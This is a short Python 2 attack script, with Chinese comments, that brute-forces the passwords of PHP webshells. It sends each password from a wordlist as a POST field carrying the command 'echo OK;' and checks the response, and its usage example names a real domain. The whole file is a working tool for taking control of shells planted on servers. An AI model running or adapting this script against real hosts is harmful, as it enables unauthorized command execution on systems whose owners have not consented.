#!/url/bin/env python
# -*- coding: UTF-8 -*-

import urllib2
import urllib
import sys
import argparse
import threading

#headers = {"Content-Type":"application/x-www-form-urlencoded",    
#           "Connection":"Keep-Alive",
#           "Referer":"http://www.baidu.com/"};

def BurpShell(host, password):
    global headers
    url = host
    data = urllib.urlencode({password:"echo OK;"}) #定义POST数据包
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read()
    result = the_page.find('OK')
    #print result
    if result != -1 : #如果返回数据是OK
        print '----- find password:', password
        sys.exit()
    return
def usage():
    print """Example: 
                    %s --burp=http://www.baidu.com/shell.php 
            """ % (sys.argv[0])
    exit()
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    else:
        parser = argparse.ArgumentParser(description='Fuck PhpWebshell Password')
        parser.add_argument('--burp', action='store', dest="host")
        given_args = parser.parse_args()
        host = given_args.host
        tsk=[] #创建进程池
        with open(r'pass.txt', 'r') as fPass:
            for password in fPass.readlines():
                password = password.strip()
                #print 'xxxxxxx %s >> %s >> %s' % (host, shell, password)
                t= threading.Thread(target = BurpShell, args=(host, password))
                t.daemon = True # 设置进行进程守护 可自行修改
                tsk.append(t) # t.start()
            fPass.seek(0)

        for t in tsk:
            t.start()
            t.join(1)  #不阻塞线程 ,1s

        print "All thread OK,maybe not "
        sys.exit()
